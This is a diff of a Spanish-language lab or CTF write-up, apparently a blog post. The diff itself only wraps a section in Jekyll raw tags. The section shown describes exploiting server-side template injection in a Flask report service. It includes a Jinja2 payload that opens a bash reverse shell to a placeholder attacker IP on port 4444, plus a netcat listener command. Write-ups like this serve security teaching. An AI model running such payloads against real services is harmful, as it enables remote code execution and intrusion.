@@ -886,6 +886,7 @@ El servicio se autodescribe en la raíz:
 
 ![Meridian Report Service renderizando el informe por defecto](/assets/img/Custom/ProjectManager2/cap7.png)
 
+{% raw %}
 Un servicio Flask que refleja la entrada del usuario en su salida es un candidato de primera para Server-Side Template Injection. Que refleje una expresión Jinja2 en vez de un literal es la señal — `{{7*7}}` volvió evaluado:
 
 ```text
@@ -913,6 +914,7 @@ El servicio corre como `ander`, que es miembro del grupo `sysadmin`. Cambiando `
 ```text
 /report?name={% with a = config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'").read() %}{{ a }}{% endwith %}
 ```
+{% endraw %}
 
 ```bash
 nc -nlvp 4444
